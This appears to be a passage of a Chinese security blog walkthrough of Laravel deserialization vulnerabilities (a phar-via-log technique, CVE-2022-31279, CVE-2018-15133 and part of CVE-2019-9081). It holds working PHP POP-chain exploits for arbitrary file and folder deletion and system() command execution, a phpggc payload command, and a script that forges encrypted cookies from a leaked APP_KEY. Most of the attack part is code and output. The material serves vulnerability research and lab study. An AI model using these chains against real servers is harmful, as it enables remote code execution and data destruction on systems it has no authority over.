<p>即，清空log之后，发送一个payload为”AA”  的数据表，此时报错然后记录再log中，此时字符个数是奇数个（如果只发送一个A,结果是偶数个），此时再发送一个上面不加A的payload <code>=50=00=44=00=39...</code>,此时两个奇数个的数据表加起来就能经过<code>convert.iconv.utf-16le.utf-8</code>正常的处理了</p>
<p>处理后的结果：</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718103632817.png" alt="image-20230718103632817"></p>
<p>可以看到有两处相同的base64编码，即使后面正常的解密出来，也得不到正常的phar文件，我们可以在payload前面或者后面添加字符，使得utf-16转成utf-8时总有一个payload能被转换出来。</p>
<p>添加字符后不能改变奇偶性，所以如果在后面添加，log永远是偶数，但是在我的环境中经过base64解密后，会报错，所以在考虑前面加，如果在前面加，就要添加字符的个数为3的倍数,这样才不会改变奇偶性,这里添加了3个A</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718105846412.png" alt="image-20230718105846412"></p>
<p>base64解密前</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718105152647.png" alt="image-20230718105152647"></p>
<p>解密后：</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718105302708.png" alt="image-20230718105302708"></p>
<p>此时已经将phar文件写入了log里面，最后一步就是触发phar反序列化了</p>
<pre><code>phar://../storage/logs/laravel.log/test.txt
</code></pre>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718105622874.png" alt="image-20230718105622874"></p>
<p>每个人的环境不同，payload构造不一样，网上的脚本不一定能用</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="5-4-x-CVE-2022-31279"><a href="#5-4-x-CVE-2022-31279" class="headerlink" title="5.4.x (CVE-2022-31279)"></a>5.4.x (CVE-2022-31279)</h3><p>这里使用的是5.4.30</p>
<p>环境搭建：</p>
<p>添加控制器：<code>Http/Controllers/POPController.php</code></p>
<pre><code class="php">&lt;?php
namespace App\Http\Controllers;
class POPController extends Controller
&#123;
    public function index()
    &#123;
        if(isset($_GET[&#39;c&#39;]))&#123;
            $c = $_GET[&#39;c&#39;];
            unserialize($c);
        &#125;
        else&#123;
            phpinfo();
        &#125;
    &#125;
&#125;
</code></pre>
<p>添加路由<code>routes/web.php</code></p>
<pre><code class="php">Route::get(&quot;/&quot;,&quot;\App\Http\Controllers\POPController@index&quot;);
</code></pre>
<p>反序列化第一步，找<code>__destruct()</code>,找到了23个结果</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230719112207798.png" alt="image-20230719112207798"></p>
<p>简单看了一遍所有的结果，能用的不多，而且还找到了个简单的任意文件删除</p>
<p><code>\vendor\swiftmailer\swiftmailer\lib\classes\Swift\ByteStream\TemporaryFileByteStream.php</code></p>
<pre><code class="php">private $_path;

public function __destruct()
    &#123;
        if (file_exists($this-&gt;getPath())) &#123;
            @unlink($this-&gt;getPath());
        &#125;
    &#125;

public function getPath()
    &#123;
        return $this-&gt;_path;
    &#125;
</code></pre>
<p>这里的<code>__destruct</code>调用了<code>getPath()</code>   而这个方法里面直接返回<code>_path</code>属性,这个属性可控，修改为要删除的文件路径就能删除任意文件了</p>
<p>POC:</p>
<p>假设存在一个名为1.txt的文件在public目录下</p>
<pre><code class="php">&lt;?php
abstract class Swift_ByteStream_AbstractFilterableInputStream
&#123;
&#125;
class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream
&#123;
    private $_path;
    public function __construct()
    &#123;
        $this-&gt;_path=&#39;1.txt&#39;;//文件名
    &#125;
&#125;
class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream
&#123;
&#125;
$a=new Swift_ByteStream_TemporaryFileByteStream();
echo urlencode(serialize($a));
</code></pre>
<p>另外一个是删除任意文件夹</p>
<pre><code class="php">//vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php
public function __destruct()
    &#123;
        foreach ($this-&gt;_keys as $nsKey =&gt; $null) &#123;
            $this-&gt;clearAll($nsKey);
        &#125;
   &#125;
</code></pre>
<p>这里的<code>$this-&gt;_keys</code>可以控制，说明<code>$nsKey</code>可控，然后调用<code>$this-&gt;clearAll</code></p>
<pre><code class="php">public function clearAll($nsKey)
    &#123;
        if (array_key_exists($nsKey, $this-&gt;_keys)) &#123;
            foreach ($this-&gt;_keys[$nsKey] as $itemKey =&gt; $null) &#123;
                $this-&gt;clearKey($nsKey, $itemKey);
            &#125;
            if (is_dir($this-&gt;_path.&#39;/&#39;.$nsKey)) &#123;
                rmdir($this-&gt;_path.&#39;/&#39;.$nsKey);
            &#125;
            unset($this-&gt;_keys[$nsKey]);
        &#125;
    &#125;
</code></pre>
<p>可以看到<strong>rmdir</strong>函数而且<code>$this-&gt;_path</code>可控，并且<code>$nsKey</code>可控，所以这里可以删除任意文件夹</p>
<p>POC2:</p>
<p>假设存在一个名为aaa的文件夹在public目录下</p>
<pre><code class="php">// 删除当前目录下名为aaa的文件夹
&lt;?php
class Swift_KeyCache_DiskKeyCache
&#123;
    private $_path;
    private $_keys = array();
    public function __construct()
    &#123;
        $this-&gt;_path=&#39;.&#39;;//当前目录
        $this-&gt;_keys=array(&#39;aaa&#39;=&gt;array(&#39;1&#39;=&gt;&#39;2&#39;)); //aaa为文件夹名
    &#125;
&#125;
$a = new Swift_KeyCache_DiskKeyCache();
echo urlencode(serialize($a));
</code></pre>
<p>下面回到开始的 <code>__destruct()</code></p>
<p>除了上面两个，还注意到这个：</p>
<p><code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code></p>
<pre><code class="php">public function __destruct()
    &#123;
        $this-&gt;events-&gt;dispatch($this-&gt;event);
    &#125;
</code></pre>
<p>这里可以触发<code>__call</code>,也可以调用任意类的<code>dispatch()</code>,如果是调用<code>dispatch</code>方法，可有控制输入的参数<code>$this-&gt;event</code></p>
<p>先走__call这个方向看看，全局查找 <code>__call</code> ,找到很多</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230719144322636.png" alt="image-20230719144322636"></p>
<p>这里找到</p>
<p><code>vendor/fzaninotto/faker/src/Faker/Generator.php</code></p>
<pre><code class="php">public function __call($method, $attributes)
    &#123;
        return $this-&gt;format($method, $attributes);
    &#125;
</code></pre>
<p>这里的$method为触发__call调用的方法名<code>dispatch</code>, 而<code>$attributes</code>为dispatch的参数，即<code>$this-&gt;event</code>,可控</p>
<p>跟进<code>format</code></p>
<pre><code class="php">public function format($formatter, $arguments = array())
    &#123;
        return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);
    &#125;
</code></pre>
<p>这里调用了<code>call_user_func_array</code> ，再跟进<code>getFormatter</code></p>
<pre><code class="php">public function getFormatter($formatter)
    &#123;
        if (isset($this-&gt;formatters[$formatter])) &#123;
            return $this-&gt;formatters[$formatter];
        &#125;
        foreach ($this-&gt;providers as $provider) &#123;
            if (method_exists($provider, $formatter)) &#123;
                $this-&gt;formatters[$formatter] = array($provider, $formatter);

                return $this-&gt;formatters[$formatter];
            &#125;
        &#125;
        throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));
    &#125;
</code></pre>
<p>注意第一个if ,这个<code>$this-&gt;formatters</code>可控，如果构造<code>$this-&gt;formatters=[&#39;dispatch&#39;=&gt;&#39;system&#39;]</code>,就能返回函数名system 利用call_user_func_array调用system函数</p>
<p>构造POC尝试</p>
<pre><code class="php">&lt;?php
namespace Illuminate\Broadcasting;
use Faker\Generator;
class PendingBroadcast
&#123;
    protected $events;
    protected $event;
    public function __construct()
    &#123;
        $this-&gt;event = &#39;calc&#39;;
        $this-&gt;events = new Generator();
    &#125;
&#125;
namespace Faker;
class Generator
&#123;
    protected $formatters = array();
    public function __construct()
    &#123;
        $this-&gt;formatters=[&#39;dispatch&#39;=&gt;&#39;system&#39;];
    &#125;
&#125;
use Illuminate\Broadcasting\PendingBroadcast;
$a = new PendingBroadcast();
echo urlencode(serialize($a));
</code></pre>
<p>经过调试发现<code>$this-&gt;formatters</code>赋值不上，原因是这个类存在一个__wakeup将$this-&gt;formatters 置空了</p>
<pre><code class="php">public function __wakeup()
&#123;
   $this-&gt;formatters = [];
&#125;
</code></pre>
<p>这个可以绕过，只要序列化的中的成员数大于实际成员数，即可绕过，但是有php版本限制，PHP5&lt;5.6.25，PHP7 &lt; 7.0.10</p>
<p>而安装laravel的php版本需要php&gt;&#x3D;5.64 ， 如果修改了成员数，是可以绕过__wakeup,但是会造成<code>$this-&gt;event = &#39;calc&#39;;</code>赋不上值</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230719162724629.png" alt="image-20230719162724629"></p>
<p>这条链子就这样被掐断了，尝试寻找其他绕过的方法</p>
<p>参考了<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11886%EF%BC%8C%E6%89%BE%E5%88%B0%E4%BA%86%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%8C%E8%BF%99%E9%87%8C%E9%9C%80%E8%A6%81%E5%8E%BBhttps://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/%E7%9C%8B%E7%9C%8B%EF%BC%8C%E7%90%86%E8%A7%A3%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84R%E5%92%8Cr%E7%9A%84%E5%85%B3%E7%B3%BB%EF%BC%8C%E5%85%B7%E4%BD%93%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86%E9%87%8C%E9%9D%A2%E6%9C%89%E8%AE%B2">https://xz.aliyun.com/t/11886，找到了另外一种绕过方法，这里需要去https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/看看，理解序列化字符串中的R和r的关系，具体绕过原理里面有讲</a></p>
<p>总的来说就是：</p>
<ol>
<li>让 <code>Faker\Generator</code> 的 <code>$this-&gt;formatters</code> 和某个对象<code>$o</code>的某个属性 <code>$a</code> 指向同一个值</li>
<li>在 <code>Faker\Generator</code> 的 <code>__wakeup()</code> 运行完之后，反序列化 gadget 的 <code>__destruct()</code> 运行之前，给 <code>$a</code> 赋值</li>
<li><code>$a</code> 的赋值如果完全可控，那么 <code>$this-&gt;formatters</code> 将不再为空，且完全可控</li>
</ol>
<p>构造链子的过程<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11886%E6%9C%89%EF%BC%8C%E8%BF%99%E9%87%8C%E5%B0%B1%E4%B8%8D%E5%A4%9ABB%E4%BA%86%EF%BC%8C%E4%B8%8B%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%E5%86%99%E9%93%BE%E5%AD%90%E7%9A%84%E6%97%B6%E5%80%99%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91%EF%BC%9A">https://xz.aliyun.com/t/11886有，这里就不多BB了，下面是自己写链子的时候遇到的一些坑：</a></p>
<p>首先是构造<code>Symfony\Component\Routing\Route</code>的时候，没有实现Serializable接口的方法，导致报错无法进行下去，尽管在利用的过程中没有找到利用到它们的地方</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230720203701975.png" alt="image-20230720203701975"></p>
<p>还有就是替换的地方，需要了解序列化字符串的结果，每个符号表示什么，主要是准确找到需要替换的地方</p>
<pre><code class="php">echo urlencode(str_replace(&#39;a:1:&#123;s:2:&quot;aa&quot;;s:2:&quot;bb&quot;;&#125;&#39;, &#39;R:14;&#39;, serialize($a)));
</code></pre>
<p>R后面的数字是什么意思，参考这篇文章<a target="_blank" rel="noopener" href="https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/">https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/</a></p>
<p>最后的POC</p>
<pre><code class="php">&lt;?php
namespace Symfony\Component\Routing\Loader\Configurator;
use Symfony\Component\Routing\RouteCollection;
use Symfony\Component\Routing\Route;
use Illuminate\Broadcasting\PendingBroadcast;
class CollectionConfigurator
&#123;
    private $route;
    public function __construct()
    &#123;
        $this-&gt;parent = new RouteCollection();
        $this-&gt;collection = new RouteCollection();
        $this-&gt;route = new Route(&#39;&#39;);
        $this-&gt;parentConfigurator = new PendingBroadcast();
    &#125;
&#125;

namespace Symfony\Component\Routing;
class RouteCollection
&#123;
    private $routes;
    public function __construct()
    &#123;
        $this-&gt;routes = array(&quot;dispatch&quot; =&gt; &quot;system&quot;);
    &#125;
&#125;

namespace Symfony\Component\Routing;
class Route implements \Serializable
&#123;
    private $path;
    public function __construct()
    &#123;
        $this-&gt;path=&quot;//&quot;;
    &#125;

    public function serialize()
    &#123;
        return serialize([
            &#39;path&#39; =&gt; $this-&gt;path,
            &#39;host&#39; =&gt; $this-&gt;host,
            &#39;defaults&#39; =&gt; $this-&gt;defaults,
            &#39;requirements&#39; =&gt; $this-&gt;requirements,
            &#39;options&#39; =&gt; $this-&gt;options,
            &#39;schemes&#39; =&gt; $this-&gt;schemes,
            &#39;methods&#39; =&gt; $this-&gt;methods,
            &#39;condition&#39; =&gt; $this-&gt;condition,
            &#39;compiled&#39; =&gt; $this-&gt;compiled,
        ]);
    &#125;
    public function unserialize($serialized)
    &#123;
    &#125;

&#125;

//---------------下面这段是前面未成功的POC

namespace Illuminate\Broadcasting;
use Faker\Generator;
class PendingBroadcast
&#123;
    protected $events;
    protected $event;
    public function __construct()
    &#123;
        $this-&gt;events=new Generator();
        $this-&gt;event=&quot;calc&quot;;
    &#125;
&#125;

namespace Faker;
class Generator
&#123;
    protected $formatters = array();
    public function __construct()
    &#123;
        $this-&gt;formatters=[&quot;aa&quot;=&gt;&quot;bb&quot;];
    &#125;
&#125;

use Symfony\Component\Routing\Loader\Configurator\CollectionConfigurator;
$a = new CollectionConfigurator();

echo urlencode(str_replace(&#39;a:1:&#123;s:2:&quot;aa&quot;;s:2:&quot;bb&quot;;&#125;&#39;, &#39;R:14;&#39;, serialize($a)));
</code></pre>
<h3 id="CVE-2018-15133"><a href="#CVE-2018-15133" class="headerlink" title="CVE-2018-15133"></a>CVE-2018-15133</h3><p>漏洞利用前提：</p>
<p>需要获取app_key+Laravel framework 5.5.x&lt;&#x3D;5.5.40或5.6.x&lt;&#x3D;5.6.29</p>
<p>环境搭建：</p>
<pre><code class="php">composer create-project laravel/laravel laravel-5.6.29 --prefer-dist &quot;5.6.0&quot;
</code></pre>
<p>然后修改composer.json  中的<code>laravel/framework</code>版本为<strong>5.6.29</strong>  运行composer update</p>
<p>如果出现报错：PackageManifest.php: Undefined index: name</p>
<pre><code class="php">找到对应文件 :

vendor/laravel/framework/src/Illuminate/Foundation/PackageManifest.php

找到对应行注释掉 :

$packages = json_decode($this-&gt;files-&gt;get($path), true);

在这里新增两行代码

$installed = json_decode($this-&gt;files-&gt;get($path), true);
$packages = $installed[&#39;packages&#39;] ?? $installed;
</code></pre>
<p>官方修复：<code>src/Illuminate/Cookie/Middleware/EncryptCookies.php</code><br><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230721094831825.png" alt="image-20230721094831825"></p>
<p><code>src/Illuminate/Foundation/Http/Middleware/VerifyCsrfToken.php</code></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230721094915218.png" alt="image-20230721094915218"></p>
<p>官方通过添加静态的serialized方法来控制序列化和反序列化  </p>
<p>在<code>src/Illuminate/Cookie/Middleware/EncryptCookies.php</code>中，找到官方修复的地方</p>
<pre><code class="php">protected function encrypt(Response $response)
    &#123;
        foreach ($response-&gt;headers-&gt;getCookies() as $cookie) &#123;
            if ($this-&gt;isDisabled($cookie-&gt;getName())) &#123;
                continue;
            &#125;

            $response-&gt;headers-&gt;setCookie($this-&gt;duplicate(
                $cookie, $this-&gt;encrypter-&gt;encrypt($cookie-&gt;getValue())
            ));
        &#125;

        return $response;
    &#125;
</code></pre>
<p>这里是cookie加密的地方，首先从http请求中获取cookie,然后传进<code>isDisabled</code>进行检查, 这方法不重要，重要的是后面的<code>encrypt</code>方法，经过这个方法加密得到的cookie,然后传给setCookie，响应到前端设置新的Cookie值</p>
<p>下面跟进encrypt方法：</p>
<pre><code class="php">public function encrypt($value, $serialize = true)
    &#123;
        $iv = random_bytes(openssl_cipher_iv_length($this-&gt;cipher));

        // First we will encrypt the value using OpenSSL. After this is encrypted we
        // will proceed to calculating a MAC for the encrypted value so that this
        // value can be verified later as not having been changed by the users.
        $value = \openssl_encrypt(
            $serialize ? serialize($value) : $value,
            $this-&gt;cipher, $this-&gt;key, 0, $iv
        );

        if ($value === false) &#123;
            throw new EncryptException(&#39;Could not encrypt the data.&#39;);
        &#125;

        // Once we get the encrypted value we&#39;ll go ahead and base64_encode the input
        // vector and create the MAC for the encrypted value so we can then verify
        // its authenticity. Then, we&#39;ll JSON the data into the &quot;payload&quot; array.
        $mac = $this-&gt;hash($iv = base64_encode($iv), $value);

        $json = json_encode(compact(&#39;iv&#39;, &#39;value&#39;, &#39;mac&#39;));

        if (json_last_error() !== JSON_ERROR_NONE) &#123;
            throw new EncryptException(&#39;Could not encrypt the data.&#39;);
        &#125;

        return base64_encode($json);
    &#125;
</code></pre>
<p>加密的过程如下：</p>
<ol>
<li><p>先随机生成一个初始化向量iv,iv 的长度由所选的加密算法决定,这里的加密算法默认是<code>AES-128-CBC</code>,也可能是AES-256-CBC，调试发现是使用AES-256-CBC</p>
</li>
<li><p>然后使用 OpenSSL 库中的 <code>openssl_encrypt()</code> 方法对数据进行加密。如果 <code>$serialize</code> 参数为 <code>true</code>，则将值先进行序列化，然后再进行加密。加密使用了指定的加密算法 <code>$this-&gt;cipher</code>即，密钥为 <code>$this-&gt;key</code>，即base64解密后的APP_KEY ，加密模式为默认值 0，使用前面生成的 iv</p>
</li>
<li><p>下一步是检查加密过程是否失败，如果失败则抛出 <code>EncryptException</code> 异常</p>
</li>
<li><p>mac的计算是通过调用 <code>hash()</code> 方法，使用哈希算法生成对加密后的数据进行校验的消息认证码（Message Authentication Code, MAC）。其中，IV 经过 Base64 编码后作为参数传递给 <code>hash()</code> 方法。</p>
</li>
<li><p>将 iv、加密后的值和 MAC 组成一个关联数组，然后使用 JSON 编码将其转换为字符串</p>
</li>
<li><p>最后就是将JSON字符串进行base64编码返回到前端</p>
</li>
</ol>
<p>这里加密存在序列化，说明解密过程大概率存在反序列化</p>
<pre><code class="php">protected function decrypt(Request $request)
    &#123;
        foreach ($request-&gt;cookies as $key =&gt; $cookie) &#123;
            if ($this-&gt;isDisabled($key)) &#123;
                continue;
            &#125;

            try &#123;
                $request-&gt;cookies-&gt;set($key, $this-&gt;decryptCookie($cookie));
            &#125; catch (DecryptException $e) &#123;
                $request-&gt;cookies-&gt;set($key, null);
            &#125;
        &#125;

        return $request;
    &#125;
</code></pre>
<p>这个解密和加密差不多，重请求中获取cookie，然后进行解密，跟进<code>decryptCookie</code></p>
<pre><code class="php">protected function decryptCookie($cookie)
    &#123;
        return is_array($cookie)
                        ? $this-&gt;decryptArray($cookie)
                        : $this-&gt;encrypter-&gt;decrypt($cookie);
    &#125;
</code></pre>
<p>这里会判断cookie是不是数组，如果是则调用<code>decryptArray</code>,如果不是则直接调用<code>decrypt</code></p>
<p>查看<code>decryptArray</code></p>
<pre><code class="php">protected function decryptArray(array $cookie)
    &#123;
        $decrypted = [];

        foreach ($cookie as $key =&gt; $value) &#123;
            if (is_string($value)) &#123;
                $decrypted[$key] = $this-&gt;encrypter-&gt;decrypt($value);
            &#125;
        &#125;

        return $decrypted;
    &#125;
</code></pre>
<p>如果是数组则遍历解密，直接看<code>decrypt</code>方法</p>
<pre><code class="php">public function decrypt($payload, $unserialize = true)
    &#123;
        $payload = $this-&gt;getJsonPayload($payload);

        $iv = base64_decode($payload[&#39;iv&#39;]);

        // Here we will decrypt the value. If we are able to successfully decrypt it
        // we will then unserialize it and return it out to the caller. If we are
        // unable to decrypt this value we will throw out an exception message.
        $decrypted = \openssl_decrypt(
            $payload[&#39;value&#39;], $this-&gt;cipher, $this-&gt;key, 0, $iv
        );

        if ($decrypted === false) &#123;
            throw new DecryptException(&#39;Could not decrypt the data.&#39;);
        &#125;

        return $unserialize ? unserialize($decrypted) : $decrypted;
    &#125;
</code></pre>
<ol>
<li>通过调用 <code>getJsonPayload()</code> 方法获取密文数据的 JSON 解码后的关联数组</li>
<li>将 Base64 编码的 IV 进行解码，得到原始的初始化向量</li>
<li>然后使用 OpenSSL 库中的 <code>openssl_decrypt()</code> 方法对密文进行解密。解密使用了与加密时相同的加密算法 <code>$this-&gt;cipher</code> 和密钥 <code>$this-&gt;key</code>，加密模式为默认值 0，初始化向量为之前解码得到的 IV</li>
<li>检查解密过程是否失败，如果失败则抛出 <code>DecryptException</code> 异常</li>
<li>根据 <code>$unserialize</code> 参数决定是否进行反序列化操作。如果指定为 <code>true</code>，则对解密后的数据进行反序列化并返回，否则直接返回解密后的数据。</li>
</ol>
<p>到这里很清晰的知道如何触发反序列化漏洞了，就是构造value部分，将序列化后的字符串进行AES-256-CBC加密</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230721154009506.png" alt="image-20230721154009506"></p>
<p>下一步就是找反序列化链，这里可以直接使用<a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/phpggc">https://github.com/ianxtianxt/phpggc</a> 工具生成,建议生成的序列化字符串进行base64编码，如果直接复制去加密，大概率会出错，导致反序列化不成功</p>
<pre><code class="bash">./phpggc Laravel/RCE3 system calc | base64
</code></pre>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230721195009139.png" alt="image-20230721195009139"></p>
<p>然后就按照上面的加密过程进行写个php加密脚本</p>
<p>$key是<code>APP_KEY</code> , $value是上面工具生成</p>
<pre><code class="php">&lt;?php
$key = &quot;qiGlxICOjT6xZ70O4qMc2oHPWjzqLT4bH8ePsfXavRU=&quot;;
$value = &quot;Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIA
KgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6
Mzp7czo2OiIAKgBhcHAiO3M6NDoiY2FsYyI7czoxNzoiACoAZGVmYXVsdENoYW5uZWwiO3M6MToi
eCI7czoxNzoiACoAY3VzdG9tQ3JlYXRvcnMiO2E6MTp7czoxOiJ4IjtzOjY6InN5c3RlbSI7fX19
Cg==&quot;;
$cipher = &#39;AES-256-CBC&#39;;

$iv = random_bytes(openssl_cipher_iv_length($cipher));
$value = \openssl_encrypt(
    base64_decode($value), $cipher, base64_decode($key), 0, $iv
);
$iv = base64_encode($iv);
$mac = hash_hmac(&#39;sha256&#39;, $iv.$value, base64_decode($key));
$json = json_encode(compact(&#39;iv&#39;, &#39;value&#39;, &#39;mac&#39;));
$encodedPayload = base64_encode($json);
echo &quot;加密结果&quot; . $encodedPayload . &quot;;&quot;;
</code></pre>
<p>然后随便替换一个cookie即可</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230721180612955.png" alt="image-20230721180612955"></p>
<h3 id="CVE-2019-9081"><a href="#CVE-2019-9081" class="headerlink" title="CVE-2019-9081"></a>CVE-2019-9081</h3><p>漏洞简介：</p>
<p>Laravel Framework 5.7.x版本中的Illuminate组件存在反序列化漏洞，远程攻击者可利用该漏洞执行代码</p>
<p>环境搭建</p>
<pre><code>composer create-project laravel/laravel laravel-5.7.29 --prefer-dist &quot;5.7&quot;
</code></pre>
<p>添加控制器：<code>Http/Controllers/POPController.php</code></p>
<pre><code class="php">&lt;?php
namespace App\Http\Controllers;
class POPController extends Controller
&#123;
    public function index()
    &#123;
        if(isset($_GET[&#39;c&#39;]))&#123;
            $c = $_GET[&#39;c&#39;];
            unserialize($c);
        &#125;
        else&#123;
            phpinfo();
        &#125;
    &#125;
&#125;
</code></pre>
<p>添加路由<code>routes/web.php</code></p>
<pre><code class="php">Route::get(&quot;/&quot;,&quot;\App\Http\Controllers\POPController@index&quot;);
</code></pre>
<p>Laravel v5.7相较Laravel v5.6在<code>vendor/laravel/framework/src/Illuminate/Foundation/Testing</code>下新增了<code>PendingCommand.php</code>，其中有<code>PendingCommand</code>类，它的<code>__destruct</code>方法是这样的</p>
<pre><code class="php">public function __destruct()
    &#123;
        if ($this-&gt;hasExecuted) &#123;
            return;
        &#125;

        $this-&gt;run();
    &#125;
</code></pre>
<p>查看官方文档</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724101641216.png" alt="image-20230724101641216"></p>
<p>这个run方法是用来执行命令的</p>
<p>查看这个方法：</p>
<pre><code class="php">public function run()
    &#123;
        $this-&gt;hasExecuted = true;
        $this-&gt;mockConsoleOutput();
        try &#123;
            $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);
        &#125; catch (NoMatchingExpectationException $e) &#123;
            if ($e-&gt;getMethodName() === &#39;askQuestion&#39;) &#123;
                $this-&gt;test-&gt;fail(&#39;Unexpected question &quot;&#39;.$e-&gt;getActualArguments()[0]-&gt;getQuestion().&#39;&quot; was asked.&#39;);
            &#125;

            throw $e;
        &#125;

        if ($this-&gt;expectedExitCode !== null) &#123;
            $this-&gt;test-&gt;assertEquals(
                $this-&gt;expectedExitCode, $exitCode,
                &quot;Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;.&quot;
            );
        &#125;

        return $exitCode;
    &#125;
</code></pre>
<p>可以猜测<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>这个是用来执行命令的，具体是怎么执行命令的需要调试一下，但是<code>mockConsoleOutput()</code>方法里面报错了</p>
<p>为了程序能够走到<code>$exitCode</code>,跟进<code>mockConsoleOutput()</code></p>
<pre><code class="php">protected function mockConsoleOutput()
    &#123;
        $mock = Mockery::mock(OutputStyle::class.&#39;[askQuestion]&#39;, [
            (new ArrayInput($this-&gt;parameters)), $this-&gt;createABufferedOutputMock(),
        ]);
        foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) &#123;
            $mock-&gt;shouldReceive(&#39;askQuestion&#39;)
                -&gt;once()
                -&gt;ordered()
                -&gt;with(Mockery::on(function ($argument) use ($question) &#123;
                    return $argument-&gt;getQuestion() == $question[0];
                &#125;))
                -&gt;andReturnUsing(function () use ($question, $i) &#123;
                    unset($this-&gt;test-&gt;expectedQuestions[$i]);

                    return $question[1];
                &#125;);
        &#125;
        $this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) &#123;
            return $mock;
        &#125;);
    &#125;
</code></pre>
<p>第一个出现的报错是<code>$this-&gt;parameters</code>没有值，这里需要的是一个数组，那就给他一个数组</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724103411878.png" alt="image-20230724103411878"></p>
<p>再跟进第二行的<code>createABufferedOutputMock()</code></p>
<pre><code class="php">private function createABufferedOutputMock()
    &#123;
        $mock = Mockery::mock(BufferedOutput::class.&#39;[doWrite]&#39;)
                -&gt;shouldAllowMockingProtectedMethods()
                -&gt;shouldIgnoreMissing();

        foreach ($this-&gt;test-&gt;expectedOutput as $i =&gt; $output) &#123;
            $mock-&gt;shouldReceive(&#39;doWrite&#39;)
                -&gt;once()
                -&gt;ordered()
                -&gt;with($output, Mockery::any())
                -&gt;andReturnUsing(function () use ($i) &#123;
                    unset($this-&gt;test-&gt;expectedOutput[$i]);
                &#125;);
        &#125;

        return $mock;
    &#125;
</code></pre>
<p>第二个报错就是在这里</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724102703652.png" alt="image-20230724102703652"></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724102723368.png" alt="image-20230724102723368"></p>
<p>此时这个test和expectedOutput都是空的，这里有两个思路，一个是触发__get然后返回，第二个是找到一个存在expectedOutput属性的方法</p>
<p>这里直接找__get，如果找到一个get直接返回，那就省事多了</p>
<p>找到了<code>vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php</code></p>
<pre><code class="php">public function __get($attribute)
    &#123;
        return $this-&gt;default;
    &#125;
</code></pre>
<p>这个返回值<code>$this-&gt;default</code>可以控制，随便给他赋值就行</p>
<p>所以直接让<code>$this-&gt;test=new DefaultGenerator()</code>就行</p>
<p>然后直接执行到了<code>mockConsoleOutput</code>的最后</p>
<pre><code class="php">$this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) &#123;
            return $mock;
        &#125;);
</code></pre>
<p>这个app也需要赋值，还关联着后面命令执行的地方<code>$this-&gt;app[Kernel::class]</code></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724105210640.png" alt="image-20230724105210640"></p>
<p>这里的$this-&gt;app[Kernel::class]应该是获取应用内核实例，百度查了一下，这个$this-&gt;app应该是<code>Illuminate\Container\Container</code>这个类</p>
<p>因为它是Laravel中的容器的实现，而且这个类中存在bind方法，满足了<code>mockConsoleOutput</code>的最后，不会报错，然后还存在<code>call</code>方法,满足$this-&gt;app[Kernel::class]-&gt;call()</p>
<p>所以</p>
<pre><code class="php">$this-&gt;app = new Container();
</code></pre>
<p>往下运行发现报错了</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724145143441.png" alt="image-20230724145143441"></p>
<p>报错的位置在<code>resolve</code>方法里，由于$concrete和$abstract相同，进入了build方法</p>
<pre><code class="php">protected function isBuildable($concrete, $abstract)
    &#123;
        return $concrete === $abstract || $concrete instanceof Closure;
    &#125;
</code></pre>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724145927211.png" alt="image-20230724145927211"></p>
